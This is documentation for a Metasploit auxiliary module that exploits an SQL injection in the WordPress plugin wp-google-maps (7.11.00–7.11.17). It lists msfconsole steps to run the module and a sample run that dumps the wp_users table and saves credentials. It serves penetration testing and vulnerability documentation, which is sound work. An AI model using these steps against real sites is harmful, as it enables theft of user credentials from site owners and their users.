## Vulnerable Application

This module works against the Wordpress plugin `wp-google-maps` between 7.11.00 and 7.11.17 (included).

[The vulnerable version is available on WordPress' plugin directory](https://downloads.wordpress.org/plugin/wp-google-maps.7.11.17.zip).

## Verification Steps

  1. `msfconsole`
  2. `use auxiliary/admin/http/wp_google_maps_sqli`
  3. `set RHOSTS <rhost>`
  4. Set `DB_PREFIX` if necessary
  5. `run`

## Options

### `DB_PREFIX` 

Change the table prefix. By default, this option is set to `wp_`.

## Scenarios

### wp-google-maps 7.11.17 on WordPress 4.9.5

```
msf5 auxiliary(admin/http/wp_google_maps_sqli) > exploit
[*] Running module against 172.22.222.144

[*] 172.22.222.144:80 - Trying to retrieve the wp_users table...
[+] Credentials saved in: /home/msfdev/.msf4/loot/20190415065921_default_172.22.222.144_wp_google_maps.j_022930.bin
[+] 172.22.222.144:80 - Found msfdev <hash> <email>
[*] Auxiliary module execution completed
```
